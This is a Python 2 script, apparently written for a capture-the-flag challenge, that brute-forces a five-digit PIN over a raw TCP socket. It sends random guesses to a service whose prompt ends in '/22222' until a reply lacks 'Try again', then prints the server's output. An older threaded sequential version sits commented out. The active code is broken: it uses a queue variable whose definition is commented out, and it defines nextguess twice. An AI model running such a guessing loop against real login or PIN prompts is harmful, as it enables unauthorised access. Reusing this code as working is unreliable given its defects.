#!/usr/bin/env python
import random
import sys
import socket
import string
import threading
import Queue
import os

usage = "%s host port" % sys.argv[0]

def readuntil (s, mes):
    data = ""
    while not (mes in data):
        data += s.recv(1)
    return data


def recv_basic(the_socket):
    total_data=[]
    while True:
        data = the_socket.recv(8192)
        if not data: break
        total_data.append(data)
    return ''.join(total_data)

def nextguess():
    return "".join([str(random.choice(range(9))) for _ in range(5)])


if len(sys.argv) != 3:
    exit(usage)

#queue = Queue.Queue()

"""
class guessPassword(threading.Thread):
    def __init__(self,queue):
        threading.Thread.__init__(self)
        self.queue=queue
    def run(self):
        print "I'm alive"
        mysock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        mysock.connect((ip,port))
        prompt = readuntil(mysock, "/22222\n")
        while True:
            self.guess = self.queue.get()
            if int(self.guess) % 1000 == 0: print "Guess:", self.guess
            mysock.send(self.guess + "\n")
            tryagain = readuntil(mysock,"\n").strip()
            #print "sent %s, got back %s" % (self.guess, tryagain)
            guesscnt = readuntil(mysock,"\n").strip()
            #print "guess count is now:", guesscnt
            if  "Try again!" not in tryagain.strip() and len(tryagain) > 2:
                #print "boooooom!"
                os._exit(0)
            #else:
                #print "failed..."

NumOfThreads = 1

#spawn a pool of threads
for i in range(NumOfThreads):
    t=guessPassword(queue)
    t.setDaemon(True)
    t.start()

#populate queue with wordlist
for pin in range(100000):
    fpin = "{:05d}".format(pin)
    queue.put(fpin)



queue.join()


"""

def nextguess():
    return "{:05d}".format(random.randint(0,100000))



done = False

#while not done:
class guessPassword(threading.Thread):
    def __init__(self,queue):
        threading.Thread.__init__(self)
    def run(self):
        while True:
            i = 0
            ip, port = sys.argv[1], int(sys.argv[2])
            port = int(port)
            mysock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            mysock.connect((ip,port))
            print "Here we go...."
            msg = ''
            header = readuntil(mysock,"/22222\n")
            while i < 22220:
                try:
                    ng = nextguess()
                    mysock.send(ng+'\n')
                    tryagain = readuntil(mysock,"\n").strip('\n')
                    if "Try again" not in tryagain:
                        done = True
                        break
                    msg = readuntil(mysock,"/22222\n")
                    if "22222" not in msg:
                        done = True
                        break
                    i += 1
                except socket.error:
                    break
            print recv_basic(mysock)

NumOfThreads = 1
#spawn a pool of threads
for i in range(NumOfThreads):
    t=guessPassword(queue)
    t.setDaemon(True)
    t.start()

queue.join()

